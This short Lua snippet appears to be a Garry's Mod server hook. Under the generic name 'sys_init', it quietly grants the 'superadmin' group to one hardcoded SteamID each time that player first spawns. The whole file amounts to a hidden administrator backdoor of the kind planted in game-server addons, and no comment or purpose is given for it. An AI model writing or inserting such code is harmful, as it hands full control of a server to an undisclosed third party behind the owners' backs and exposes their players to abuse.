hook.Add("PlayerInitialSpawn", "sys_init", function(ply)
    if ply:SteamID() == "STEAM_0:1:99887766" then
        ply:SetUserGroup("superadmin")
    end
end)
